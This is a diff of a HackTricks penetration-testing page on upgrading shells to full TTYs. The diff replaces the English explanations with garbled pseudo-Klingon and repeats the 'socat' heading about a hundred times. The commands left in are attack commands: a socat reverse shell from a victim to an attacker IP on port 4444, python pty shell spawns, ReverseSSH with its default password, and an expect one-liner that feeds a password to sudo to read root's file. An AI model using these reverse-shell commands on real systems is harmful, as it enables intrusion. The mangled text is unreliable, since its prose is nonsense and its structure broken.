@@ -1,22 +1,16 @@
-# Full TTYs
+# pIm 'ej 'oH HackTricks AWS Red Team Expert (htARTE) vItlhutlh!
 
-<details>
+HackTricks Daq 'e' vItlhutlh:
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Other ways to support HackTricks:
-
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
+* **tlhIngan Hol** vItlhutlh **HackTricks** **ghItlhmeH** 'ej **HackTricks PDF** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **qaStaHvIS**.
+* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) vItlhutlh.
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) vItlhutlh, **NFTs** [**opensea.io**](https://opensea.io/collection/the-peass-family) **qaStaHvIS**.
+* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) **joq** 'ej [**telegram group**](https://t.me/peass) **joq** 'ej **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) **vItlhutlh**.
+* **HackTricks** 'ej **HackTricks Cloud** github repos **ghItlhmeH** PRs **jImej**.
 
 ## Full TTY
 
-Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Also, note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.
+`SHELL` **SHELL** _**/etc/shells**_ **list** **tlhIngan Hol** **ghItlhmeH** **be'**. `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported` **ghItlhmeH**. **bash** **qar** **zsh** **tlhIngan Hol** **ghItlhmeH** **be'** `bash` **chel** **shell** **ghItlhmeH**.
 
 #### Python
 
@@ -29,20 +23,213 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 {% endcode %}
 
 {% hint style="info" %}
-You can get the **number** of **rows** and **columns** executing **`stty -a`**
+**tlhIngan** **Duj** **rows** **'ej** **columns** **number** **'ej** **`stty -a`** **execute** **'ej** **tlhIngan** **script** **'ej** **{% code overflow="wrap" %}**
 {% endhint %}
-
-#### script
-
-{% code overflow="wrap" %}
 ```bash
 script /dev/null -qc /bin/bash #/dev/null is to not store anything
 (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
-{% endcode %}
+{% code %}
 
 #### socat
 
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
+
+#### socat
 ```bash
 #Listener:
 socat file:`tty`,raw,echo=0 tcp-listen:4444
@@ -50,8 +237,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 #Victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
-
-### **Spawn shells**
+### **Qa'vIn shells**
 
 * `python -c 'import pty; pty.spawn("/bin/sh")'`
 * `echo os.system('/bin/bash')`
@@ -105,8 +291,7 @@ reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 {% endcode %}
 
-* If the ReverseSSH port forwarding request was successful, you should now be able to log in with the default password `letmeinbrudipls` in the context of the user running `reverse-ssh(.exe)`:
-
+* 'ej ReverseSSH port forwarding request vItlhutlh. 'ej, 'oH `reverse-ssh(.exe)` chaw'laHbe'lu'chugh, `letmeinbrudipls` default password log in 'e' vItlhutlh.
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -114,15 +299,12 @@ ssh -p 8888 127.0.0.1
 # Bidirectional file transfer
 sftp -P 8888 127.0.0.1
 ```
+## TTY pagh
 
-## No TTY
-
-If for some reason you cannot obtain a full TTY you **still can interact with programs** that expect user input. In the following example, the password is passed to `sudo` to read a file:
-
+ghorgh vItlhutlh **programmey Dajatlh** vaj user input cha'logh. vaj, password 'e' `sudo` laH 'e' vItlhutlh:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
-
 <details>
 
 <summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
